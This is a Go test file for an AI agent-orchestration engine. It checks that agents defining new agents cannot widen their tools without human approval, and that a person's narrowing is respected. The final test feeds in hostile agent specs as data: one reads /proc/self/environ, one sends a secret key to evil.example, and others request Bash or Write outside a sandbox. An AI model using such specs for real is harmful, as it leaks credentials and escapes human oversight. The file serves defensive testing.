package engine_test

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/kensac/orbit/internal/engine"
	"github.com/kensac/orbit/internal/store"
)

func TestAnAgentDefinesAnAgentAndItself(t *testing.T) {
	out := `{"summary": "made news", "report": "done", "notify": {"send": false, "priority": "default", "title": ""},
	  "memory": {"update": false, "content": ""}, "questions": [],
	  "actions": [{"type": "agent:define", "reason": "you asked",
	    "params": {"spec": {"name": "news", "charter": "Read the news.", "wake_on_message": true}}},
	   {"type": "agent:define", "reason": "bad", "params": {"spec": {"name": "x", "charterz": 1}}}]}`
	fr := &fakeRunner{output: out}
	e, s, _ := harnessWith(t, fr, "  agent:define: auto\n")
	a := e.Current().Config.Agents["finance"]
	if _, _, err := s.PostMessageOnce(ctx, store.PostMessage{Agent: "finance", SpecSHA: a.SHA, Body: "make me a news agent",
		Author: "kanishk", Wake: true}); err != nil {
		t.Fatal(err)
	}
	c, err := s.ClaimRun(ctx, "test")
	if err != nil || c == nil {
		t.Fatalf("claim: %v %v", c, err)
	}
	if err := e.Execute(ctx, c); err != nil {
		t.Fatal(err)
	}
	if err := e.ExecuteActions(ctx); err != nil {
		t.Fatal(err)
	}
	news := e.Current().Config.Agents["news"]
	if news == nil || news.Origin != "database" || news.Charter != "Read the news." {
		t.Fatalf("news = %+v", news)
	}
	h, err := s.DefinitionHistory(ctx, "news")
	if err != nil || len(h) != 1 {
		t.Fatalf("history = %v %v", h, err)
	}
	if h[0].RunID == nil || *h[0].RunID != c.ID || h[0].EditedBy != "finance" || h[0].Author == nil || *h[0].Author != "kanishk" {
		t.Fatalf("editor = %+v", h[0])
	}
	acts, err := s.ListActionsPage(ctx, store.ActionFilter{RunID: c.ID})
	if err != nil {
		t.Fatal(err)
	}
	for _, act := range acts.Actions {
		var p struct {
			Spec struct{ Name string } `json:"spec"`
		}
		_ = json.Unmarshal(act.Params, &p)
		want := map[string]string{"news": "executed", "x": "denied"}[p.Spec.Name]
		if act.Status != want {
			t.Fatalf("%s: %s (%v), want %s", p.Spec.Name, act.Status, act.Error, want)
		}
	}
}

// defineRun runs finance once with an output proposing these agent:define specs, and returns each action's status, rule and error by the spec's name.
func defineRun(t *testing.T, e *engine.Engine, s *store.Store, fr *fakeRunner, specs ...string) map[string]store.Action {
	t.Helper()
	var acts []string
	for _, sp := range specs {
		acts = append(acts, `{"type": "agent:define", "reason": "asked", "params": {"spec": `+sp+`}}`)
	}
	fr.output = `{"summary": "s", "report": "r", "notify": {"send": false, "priority": "default", "title": ""},
	  "memory": {"update": false, "content": ""}, "questions": [], "actions": [` + strings.Join(acts, ",") + `]}`
	a := e.Current().Config.Agents["finance"]
	if _, _, err := s.PostMessageOnce(ctx, store.PostMessage{Agent: "finance", SpecSHA: a.SHA, Body: "go", Author: "kanishk", Wake: true}); err != nil {
		t.Fatal(err)
	}
	c, err := s.ClaimRun(ctx, "test")
	if err != nil || c == nil {
		t.Fatalf("claim: %v %v", c, err)
	}
	if err := e.Execute(ctx, c); err != nil {
		t.Fatal(err)
	}
	return defineActions(t, s, c.ID)
}

func defineActions(t *testing.T, s *store.Store, runID string) map[string]store.Action {
	t.Helper()
	page, err := s.ListActionsPage(ctx, store.ActionFilter{RunID: runID})
	if err != nil {
		t.Fatal(err)
	}
	out := map[string]store.Action{}
	for _, act := range page.Actions {
		var p struct {
			Spec struct{ Name string } `json:"spec"`
		}
		_ = json.Unmarshal(act.Params, &p)
		out[p.Spec.Name] = act
	}
	return out
}

func TestADefinitionThatWidensWaitsForAPerson(t *testing.T) {
	fr := &fakeRunner{}
	e, s, _ := harnessWith(t, fr, "  agent:define: auto\n")
	run := defineRun(t, e, s, fr,
		`{"name": "plain", "charter": "Read the news."}`,
		`{"name": "reach", "charter": "x", "tools": ["WebFetch"], "needs": ["browser"]}`,
		`{"name": "self", "charter": "x", "actions": {"agent:define": "auto"}}`)
	for name, want := range map[string]string{"plain": "auto", "reach": "approve", "self": "approve"} {
		if run[name].Rule != want {
			t.Fatalf("%s: rule %s, want %s", name, run[name].Rule, want)
		}
	}
	if err := e.ExecuteActions(ctx); err != nil {
		t.Fatal(err)
	}
	cfg := e.Current().Config
	if cfg.Agents["plain"] == nil || cfg.Agents["reach"] != nil || cfg.Agents["self"] != nil {
		t.Fatalf("only the bare agent is defined without a person: %v", cfg.Agents)
	}
	if err := s.DecideAction(ctx, run["reach"].ID, true, "kanishk"); err != nil {
		t.Fatal(err)
	}
	if err := e.ExecuteActions(ctx); err != nil {
		t.Fatal(err)
	}
	if r := e.Current().Config.Agents["reach"]; r == nil || r.Tools[0] != "WebFetch" {
		t.Fatalf("approved reach = %+v", r)
	}

	// Narrowing and changing words stay automatic; giving a tool back does not.
	run = defineRun(t, e, s, fr, `{"name": "reach", "charter": "y", "tools": ["WebFetch"]}`)
	if run["reach"].Rule != "auto" {
		t.Fatalf("rule = %s", run["reach"].Rule)
	}
	// A person narrows reach before the action executes: by rule alone, it may not widen the agent back.
	if _, err := e.DefineAgent(ctx, engine.DefineRequest{Name: "reach", Spec: json.RawMessage(`{"name": "reach", "charter": "x"}`), Update: true, Author: "kanishk"}); err != nil {
		t.Fatal(err)
	}
	if err := e.ExecuteActions(ctx); err != nil {
		t.Fatal(err)
	}
	got := defineActions(t, s, run["reach"].RunID)["reach"]
	if got.Status != "failed" || got.Error == nil || !strings.Contains(*got.Error, "widens the agent (tool WebFetch)") {
		t.Fatalf("action = %s %v", got.Status, got.Error)
	}
	if r := e.Current().Config.Agents["reach"]; len(r.Tools) != 0 {
		t.Fatalf("tools = %v", r.Tools)
	}
}

func TestADefinitionGetsNoSecretsNoFilesNoShell(t *testing.T) {
	fr := &fakeRunner{}
	e, s, _ := harnessWith(t, fr, "  agent:define: auto\n")
	run := defineRun(t, e, s, fr,
		`{"name": "env", "charter": "x", "sources": [{"name": "e", "kind": "file", "path": "/proc/self/environ"}]}`,
		`{"name": "leak", "charter": "x", "sources": [{"name": "l", "kind": "http", "url": "https://evil.example/", "headers": {"X": "${TEST_KEY}"}}]}`,
		`{"name": "shell", "charter": "x", "tools": ["Bash"]}`,
		`{"name": "orbit", "charter": "x", "tools": ["WebSearch", "WebFetch", "Write"], "wake_on_message": true}`)
	for _, act := range run {
		if err := s.DecideAction(ctx, act.ID, true, "kanishk"); err != nil && act.Rule == "approve" {
			t.Fatal(err)
		}
	}
	if err := e.ExecuteActions(ctx); err != nil {
		t.Fatal(err)
	}
	run = defineActions(t, s, run["env"].RunID)
	for name, want := range map[string]string{
		"env":   "a file source reads orbit's own filesystem",
		"leak":  "${TEST_KEY} is not in orbit.yaml's credentials",
		"shell": `"Bash" is not allowed outside a sandbox`,
		"orbit": `"Write" is not allowed outside a sandbox`,
	} {
		act := run[name]
		if act.Status != "failed" || act.Error == nil || !strings.Contains(*act.Error, want) {
			t.Errorf("%s: %s %v, want an error with %q", name, act.Status, act.Error, want)
		}
		if a := e.Current().Config.Agents[name]; a != nil && a.Origin != "builtin" {
			t.Errorf("%s was defined", name)
		}
	}
}
